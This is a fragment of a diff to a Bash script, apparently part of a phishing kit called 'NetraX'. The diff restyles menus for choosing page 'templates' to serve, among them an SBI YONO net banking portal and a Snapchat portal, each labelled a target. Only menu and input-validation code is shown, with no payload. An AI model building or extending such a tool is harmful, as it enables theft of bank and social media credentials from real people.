 elif [[ $option_tem -eq 2 ]]; then
 while true; do
-    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID or URL: \e[0m' yt_video_ID
+    read -p $'\n\e[1;38;5;51m[⚡ NetraX] ❯ \e[1;38;5;255mEnter YouTube video watch ID or URL: \e[0m' yt_video_ID
     # ── PART 1: Trim leading/trailing whitespace ──────────────────────────
     yt_video_ID="${yt_video_ID#"${yt_video_ID%%[![:space:]]*}"}"
     yt_video_ID="${yt_video_ID%"${yt_video_ID##*[![:space:]]}"}"
     # ── PART 2: Extract bare ID when a full URL is pasted ─────────────────
-    #   Handles: https://www.youtube.com/watch?v=ID[&...]
-    #            https://youtu.be/ID[?...]
     if [[ "$yt_video_ID" =~ youtube\.com/watch\?.*v=([A-Za-z0-9_-]{11}) ]]; then
         yt_video_ID="${BASH_REMATCH[1]}"
     elif [[ "$yt_video_ID" =~ youtu\.be/([A-Za-z0-9_-]{11}) ]]; then
@@ -1218,10 +1239,10 @@ while true; do
     fi
     # ── PART 3: Validate --exactly 11 chars, A-Z a-z 0-9 - _ ─────────────
     if [[ "$yt_video_ID" =~ ^[A-Za-z0-9_-]{11}$ ]]; then
-        printf "\e[1;92m[\e[0m+\e[1;92m] Video ID: %s\n\e[0m" "$yt_video_ID"
+        printf "\e[1;38;5;82m[+] Video Target ID Locked: %s\n\e[0m" "$yt_video_ID"
         break
     else
-        printf "\e[1;91m [!] Invalid YouTube Video ID. Must be exactly 11 characters (A-Z, a-z, 0-9, -, _). Try again.\e[0m\n"
+        printf "\e[1;38;5;196m [!] Invalid YouTube Video ID. Must be exactly 11 characters. Try again.\e[0m\n"
     fi
 done
 elif [[ $option_tem -eq 3 ]]; then
@@ -1230,33 +1251,39 @@ elif [[ $option_tem -eq 4 ]]; then
   : # Social Media Reporting --self-contained, no extra input required
 elif [[ $option_tem -eq 5 ]]; then
   # Bank template --show bank sub-menu
-  printf "\n\e[1;95m----- Choose a Bank -----\e[0m\n"
-  printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m SBI (YONO Net Banking)\e[0m\n"
+  printf "\n\e[1;38;5;51m┌── [ 🏦  SELECT TARGET BANKING PORTAL ] ───────────────────────────────┐\e[0m\n"
+  printf "\e[1;38;5;51m│\e[0m\n"
+  printf "\e[1;38;5;51m│\e[0m   \e[1;38;5;82m[01]\e[0m \e[1;38;5;220mSBI (State Bank of India - YONO Net Banking)\e[0m\n"
+  printf "\e[1;38;5;51m│\e[0m\n"
+  printf "\e[1;38;5;51m└───────────────────────────────────────────────────────────────────────┘\e[0m\n"
   default_bank_option="1"
-  read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a bank: [Default is 1] \e[0m' bank_option
+  read -p $'\n\e[1;38;5;51m[⚡ NetraX] ❯ \e[1;38;5;255mChoose a bank [Default: 1]: \e[0m' bank_option
   bank_option="${bank_option:-${default_bank_option}}"
   if [[ $bank_option -eq 1 ]]; then
-    printf "\e[1;92m[\e[0m+\e[1;92m] Selected: SBI YONO Net Banking\e[0m\n"
+    printf "\e[1;38;5;82m[+] Target Selected: SBI YONO Net Banking\e[0m\n"
   else
-    printf "\e[1;93m [!] Invalid bank option! Defaulting to SBI.\e[0m\n"
+    printf "\e[1;38;5;208m [!] Invalid bank option! Defaulting to SBI.\e[0m\n"
     sleep 1
   fi
 elif [[ $option_tem -eq 6 ]]; then
   # Social Media template --show platform sub-menu
-  printf "\n\e[1;95m----- Choose a Social Media Platform -----\e[0m\n"
-  printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Snapchat\e[0m\n"
+  printf "\n\e[1;38;5;51m┌── [ 👻  SELECT SOCIAL MEDIA TARGET PORTAL ] ──────────────────────────┐\e[0m\n"
+  printf "\e[1;38;5;51m│\e[0m\n"
+  printf "\e[1;38;5;51m│\e[0m   \e[1;38;5;82m[01]\e[0m \e[1;38;5;220mSnapchat\e[0m\n"
+  printf "\e[1;38;5;51m│\e[0m\n"
+  printf "\e[1;38;5;51m└───────────────────────────────────────────────────────────────────────┘\e[0m\n"
   default_social_option="1"
-  read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a platform: [Default is 1] \e[0m' social_option
+  read -p $'\n\e[1;38;5;51m[⚡ NetraX] ❯ \e[1;38;5;255mChoose a platform [Default: 1]: \e[0m' social_option
   social_option="${social_option:-${default_social_option}}"
   if [[ $social_option -eq 1 ]]; then
-    printf "\e[1;92m[\e[0m+\e[1;92m] Selected: Snapchat\e[0m\n"
+    printf "\e[1;38;5;82m[+] Target Selected: Snapchat\e[0m\n"
   else
-    printf "\e[1;93m [!] Invalid option! Defaulting to Snapchat.\e[0m\n"
+    printf "\e[1;38;5;208m [!] Invalid option! Defaulting to Snapchat.\e[0m\n"
     social_option=1
     sleep 1
   fi
 else
-printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
+printf "\e[1;38;5;196m [!] Invalid template option! Try again.\e[0m\n"
 sleep 1
 select_template
 fi
